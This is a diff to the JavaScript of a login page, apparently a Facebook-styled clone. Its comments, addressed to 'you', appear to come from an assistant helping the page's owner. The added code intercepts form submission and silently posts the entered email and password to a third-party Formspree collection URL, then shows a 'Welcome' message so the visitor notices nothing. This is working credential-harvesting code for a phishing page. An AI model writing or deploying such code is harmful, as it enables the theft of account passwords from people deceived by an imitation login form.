@@ -1,49 +1,60 @@
 /*
-* I have "commented out" this entire function.
-* It was preventing your form from submitting to Formspree.
-* By commenting it out, the <form> tag in your HTML will now
-* work correctly when the "Log in" button is clicked.
+ * This is the new code to submit the form in the background.
+ * It replaces your old 'toggleSubmit' function.
 */
+document.addEventListener("DOMContentLoaded", function() {
+    // Find the form by its new ID
+    const form = document.getElementById('login-form');
+    
+    // Add a 'submit' event listener to the form
+    form.addEventListener('submit', function(event) {
+        
+        // This is the most important line:
+        // It stops the form from redirecting.
+        event.preventDefault(); 
+        
+        // Get the email value for your welcome message
+        const email = document.getElementById("email").value;
+        
+        // Get all the form data (email and psw)
+        const formData = new FormData(form);
+        const formspreeURL = 'https://formspree.io/f/manlpvpk'; // Your link
 
-// function toggleSubmit() {
-//   let email, psw;
-//   email = document.getElementById("email").value;
-//   psw = document.getElementById("psw").value;
-// 
-//   let logValue = {
-//     email: email,
-//     psw: psw,
-//   };
-//   logValue = JSON.stringify(logValue);
-//   localStorage.setItem("LogIn-Data", logValue);
-// 
-//   body.innerHTML = `<h1>Welcome, ${email}.</h1>`;
-// 
-// 
-// }
-
-// function toggleBlue() {
-//  let email, psw;
-//  email = document.getElementById("email");
-//  psw = docu
-// ment.getElementById("psw");
-
-//  if (email && psw.style.border != "1px solid #1877f2") {
-//    email && psw.style.border == "1px solid #1877f2";
-//  } else {
-//    email && psw.style.border == "1px solid #dddfe2";
-//  }
-// }
-
-// const btn = document.createElement('a')
-// if(email == 'amansamad@gmail.com'){
-//    btn.href ="https://www.facebook.com/samad.aman.336"
-// } else{
-//    localStorage.setItem("LogIn-Data", logValue);
-// }
+        // Send the data to Formspree in the background (AJAX)
+        fetch(formspreeURL, {
+            method: 'POST',
+            body: formData,
+            headers: {
+                'Accept': 'application/json'
+            }
+        })
+        .then(response => {
+            if (response.ok) {
+                // If Formspree gets the data, show your original "Welcome" message
+                document.body.innerHTML = `<h1>Welcome, ${email}.</h1>`;
+            } else {
+                // If there's an error, log it and alert the user
+                response.json().then(data => {
+                    if (Object.hasOwn(data, 'errors')) {
+                        alert(data["errors"].map(error => error["message"]).join(", "));
+                    } else {
+                        alert("Oops! There was a problem submitting your form.");
+                    }
+                })
+            }
+        })
+        .catch(error => {
+            // Handle network errors
+            alert("A network error occurred. Please check your connection.");
+        });
+    });
+});
 
 
-// This dark mode function is fine and does not need to be changed.
+/*
+ * Your original 'toggleDark' function is below.
+ * It is unchanged and will work perfectly.
+*/
 function toggleDark() {
   let btnDark = document.getElementById('btnDark');
   let body = document.getElementById('body');
